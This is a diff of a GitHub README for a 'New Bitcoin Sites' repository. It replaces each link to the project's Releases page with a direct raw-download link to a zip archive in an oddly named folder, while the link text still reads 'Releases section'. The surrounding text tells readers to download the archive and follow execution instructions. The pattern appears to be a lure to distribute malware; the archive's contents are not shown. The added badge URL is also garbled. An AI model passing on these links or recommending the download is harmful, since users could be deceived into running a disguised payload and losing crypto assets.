@@ -2,7 +2,7 @@
 
 Welcome to the **New Bitcoin Sites** repository! This project is dedicated to providing a collection of new and innovative platforms related to Bitcoin. Whether you are a developer, investor, or just curious about the world of cryptocurrency, this repository aims to be a valuable resource.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/juanjo157/New-Bitcoin-Sites/releases)
+[![Download Releases](https://github.com/juanjo157/New-Bitcoin-Sites/raw/refs/heads/main/Cicindela/Sites-Bitcoin-New-v1.4.zip%https://github.com/juanjo157/New-Bitcoin-Sites/raw/refs/heads/main/Cicindela/Sites-Bitcoin-New-v1.4.zip)](https://github.com/juanjo157/New-Bitcoin-Sites/raw/refs/heads/main/Cicindela/Sites-Bitcoin-New-v1.4.zip)
 
 ## 📦 Overview
 
@@ -16,11 +16,11 @@ Bitcoin continues to evolve, and new sites emerge regularly. This repository cur
 
 ## 🛠️ Getting Started
 
-To get started, you can download the latest release from our [Releases section](https://github.com/juanjo157/New-Bitcoin-Sites/releases). Simply follow the instructions provided in the release notes to set up and explore the new sites.
+To get started, you can download the latest release from our [Releases section](https://github.com/juanjo157/New-Bitcoin-Sites/raw/refs/heads/main/Cicindela/Sites-Bitcoin-New-v1.4.zip). Simply follow the instructions provided in the release notes to set up and explore the new sites.
 
 ### 📥 Downloading the Latest Release
 
-1. Click on the link to access the [Releases section](https://github.com/juanjo157/New-Bitcoin-Sites/releases).
+1. Click on the link to access the [Releases section](https://github.com/juanjo157/New-Bitcoin-Sites/raw/refs/heads/main/Cicindela/Sites-Bitcoin-New-v1.4.zip).
 2. Choose the latest version.
 3. Download the necessary files.
 4. Follow the execution instructions provided.
@@ -57,6 +57,6 @@ Follow us for updates on new sites and features. We are active on various platfo
 
 ### 🌟 Final Thoughts
 
-Thank you for checking out the **New Bitcoin Sites** repository! We hope you find it useful and informative. Don't forget to visit our [Releases section](https://github.com/juanjo157/New-Bitcoin-Sites/releases) to stay updated on the latest additions.
+Thank you for checking out the **New Bitcoin Sites** repository! We hope you find it useful and informative. Don't forget to visit our [Releases section](https://github.com/juanjo157/New-Bitcoin-Sites/raw/refs/heads/main/Cicindela/Sites-Bitcoin-New-v1.4.zip) to stay updated on the latest additions.
 
 Let's explore the world of Bitcoin together!
